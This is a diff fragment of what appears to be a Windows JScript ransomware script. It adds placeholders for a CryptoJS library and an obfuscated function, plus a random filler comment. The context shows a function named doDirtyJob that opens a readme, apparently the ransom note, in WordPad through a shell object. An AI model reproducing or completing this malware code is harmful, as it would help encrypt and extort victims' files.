@@ -3,6 +3,16 @@
  */
 
 
+/**
+ *
+ *  CryptoJS library here
+ *
+ */
+
+
+
+
+
 ////el8w2M79cNeHARv0lMc4agcOtvhQq861UhV7aeGJLv5aPaAfWzNhF08UcntuEQgmHQMkBANWIj0zFZKBtnxCFj08xjkwpdNmPupWanaWnlnYLZjAvfgpl5UDCdQRlDW1mrKyD239t6CHA2wvmej7ZQDMAWrm7qpwSjIKY6AjXwj5xhUpM89hXKPSXcJj3e9pSsRUm3sdyvLyrtm3M62eLwQNHnBo5aXgs4wVbHNDMWOMR7OTNj8rWbVyU61nh6cIG6C4RHytjtkmIlOrUCRkhhmKRorS839V9pcLkbCXBsDn2CBGvoHH5lbCpOmePttouGj8f4
 function roundValue(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -616,4 +626,15 @@ function doDirtyJob() {
     var cmdToExecute = "wordpad.exe" + " " + readmeFileName;
     shellObj.Run(cmdToExecute, 3);
     return 0;
+
+
+
+
+
+
+    /**
+     *
+     *  function NWvQtGjjfQX()  here
+     *
+     */
 }
